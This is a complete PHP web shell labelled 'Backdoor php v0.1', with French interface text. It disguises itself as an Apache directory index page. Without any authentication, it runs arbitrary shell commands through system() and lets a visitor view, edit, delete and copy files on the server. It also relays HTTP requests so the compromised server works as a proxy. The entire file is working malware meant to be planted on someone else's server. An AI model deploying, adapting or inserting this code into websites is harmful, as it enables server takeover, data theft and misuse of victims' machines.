<?
/*
   Backdoor php v0.1
   Coded By Charlichaplin
   charlichaplin@gmail.com
   Join me: irc.fr.worldnet.net #s-c
   Greetz: My dog :)
*/

class backdoor {
   var $pwd;
   var $rep;
   var $list = array();
   var $file;
   var $edit;
   var $fichier;
   var $del;
   var $shell;
   var $proxy;
      
   function dir() {
      if(!empty($this->rep)) {
      $dir = opendir($this->rep);
      } else {
         $dir = opendir($this->pwd);
      }
      while($f = readdir($dir)) {
          if ($f !="." && $f != "..") {
             $this->list[] = $f;
          }
      }
   }
   
   function view() {
      
      $this->file = htmlentities(highlight_file($this->file));
   }
   
   function edit() {
      if(!is_writable($this->edit)) {
         echo "Ecriture impossible sur le fichier";
      } elseif(!file_exists($this->edit)) {
         echo "Le fichier n'existe pas ";
      } elseif(!$this->fichier) {
         $fp = fopen($this->edit,"r");
         $a = "";
         while(!feof($fp)) {
            $a .= fgets($fp,1024);
         }
         echo"<form method=\"POST\" action=\"".$_SERVER['PHP_SELF']."?edit=".$this->edit."\"><textarea name=\"fichier\" cols=\"50\" rows=\"20\">".htmlentities($a)."</textarea><input name=\"Submit\" type=\"submit\"></form>";               
      } else {
         $fp = fopen($this->edit,"w+");
         fwrite($fp, $this->fichier);
         fclose($fp);
         echo "Le fichier a été modifié";
         
      }
   }
   
   function del() {
      if(is_file($this->del)) {
         if(unlink($this->del)) {
            echo "Fichier supprimé";
         } else {
            echo "Vous n'avez pas les droits pour supprimer ce fichier";
         }
      } else {
         echo $this->del." n'est pas un fichier";
      }
   }
   
   function shell() {
      echo "<form method=\"POST\" action=\"".$_SERVER['PHP_SELF']."\"><input name=\"shell\" type=\"text\"><input type=\"submit\" name=\"Shell\"></form><br>";
      system($this->shell);
   }
   
   function proxy($host,$page) {
      
      $fp = fsockopen($host,80);
      if (!$fp) {
         echo "impossible d'etablir un connection avec l'host";
      } else {
         $header = "GET ".$page." HTTP/1.1\r\n";
         $header .= "Host: ".$host."\r\n";
         $header .= "Connection: close\r\n\r\n";
         fputs($fp,$header);
         while (!feof($fp)) {
            $line = fgets($fp,1024);
            echo $line;
         }
         fclose($fp);
      }
   }
   
   function ccopy($cfichier,$cdestination) {
      if(!empty($cfichier) && !empty($cdestination)) {
         copy($cfichier, $cdestination);
         echo "Le fichier a été copié";
      } else {
         echo "<form method=\"POST\" action=\"".$_SERVER['PHP_SELF']."?copy=1\">Source: <input type=\"text\" name=\"cfichier\"><br>Destination: <input type=\"text\" name=\"cdestination\"><input type=\"submit\" title=\"Submit\"></form>";
      }
   }
}
if(!empty($_REQUEST['rep'])) {
   $rep = $_REQUEST['rep']."/";
}
$pwd = $_SERVER['SCRIPT_FILENAME'];
$pwd2  = explode("/",$pwd);
$file = $_REQUEST['file'];
$edit = $_REQUEST['edit'];
$fichier = $_POST['fichier'];
$del = $_REQUEST['del'];
$shell = $_REQUEST['shell'];
$proxy = $_REQUEST['proxy'];
$copy = $_REQUEST['copy'];
$cfichier = $_POST['cfichier'];
$cdestination = $_POST['cdestination'];

$n = count($pwd2);
$n = $n - 1;
$pwd = "";
for ($i = 0;$i != $n;$i = $i+1) {
   $pwd .= "/".$pwd2[$i];
}

if($proxy) {
$host2 = explode("/",$proxy);
$n = count($host2);
$host = $host2[2];
$page = "";
for ($i = 3;$i != $n;$i = $i+1) {
   $page .= "/".$host2[$i];
}
echo $page;
}

echo "<HTML><HEAD><TITLE>Index of ".$pwd."</TITLE>";
$backdoor = new backdoor();
$backdoor->pwd = $pwd;
$backdoor->rep = $rep;
$backdoor->file = $file;
$backdoor->edit = $edit;
$backdoor->fichier = $fichier;
$backdoor->del = $del;
$backdoor->shell = $shell;
$backdoor->proxy = $proxy;
echo "<TABLE><TR><TD bgcolor=\"#ffffff\" class=\"title\"><FONT size=\"+3\" face=\"Helvetica,Arial,sans-serif\"><B>Index of ".$backdoor->pwd."</B></FONT>";
$backdoor->dir();

echo "</TD></TR></TABLE><PRE>";
echo "<a href=\"".$_SERVER['PHP_SELF']."?shell=id\">Executer un shell</a> ";
echo "<a href=\"".$_SERVER['PHP_SELF']."?proxy=http://www.cnil.fr/index.php?id=123\">Utiliser le serveur comme proxy</a> ";
echo "<a href=\"".$_SERVER['PHP_SELF']."?copy=1\">Copier un fichier</a> <br>";
echo "<IMG border=\"0\" src=\"/icons/blank.gif\" ALT=\"     \"> <A HREF=\"\">Name</A>                    <A HREF=\"\">Last modified</A>       <A HREF=\"\">Size</A>  <A HREF=\"\">Description</A>";
echo "<HR noshade align=\"left\" width=\"80%\">";

if($file) {
   $backdoor->view();   
} elseif($edit) {
   $backdoor->edit();
} elseif($del) {   
   $backdoor->del();
} elseif($shell) {   
   $backdoor->shell();
}elseif($proxy) {
   $backdoor->proxy($host,$page);
}elseif($copy == 1) {
   $backdoor->ccopy($cfichier,$cdestination);
} else {
   echo "[DIR] <A HREF=\"".$_SERVER['PHP_SELF']."?rep=".realpath($rep."../")."\">Parent Directory</A>         ".date("r",realpath($rep."../"))."     - <br>";
   foreach ($backdoor->list as $key => $value) {
      if(is_dir($rep.$value)) {
         echo "[DIR]<A HREF=\"".$_SERVER['PHP_SELF']."?rep=".$rep.$value."\">".$value."/</A>                  ".date("r",filemtime($rep.$value))."      -  <br>";
      } else {
         echo "[FILE]<A HREF=\"".$_SERVER['PHP_SELF']."?file=".$rep.$value."\">".$value."</A>  <a href=\"".$_SERVER['PHP_SELF']."?edit=".$rep.$value."\">(edit)</a> <a href=\"".$_SERVER['PHP_SELF']."?del=".$rep.$value."\">(del)</a>          ".date("r",filemtime($rep.$value))."     1k  <br>";
      }
   }
}
echo "</PRE><HR noshade align=\"left\" width=\"80%\">";
echo "<center><b>Coded By Charlichaplin</b></center>";
echo "</BODY></HTML>";
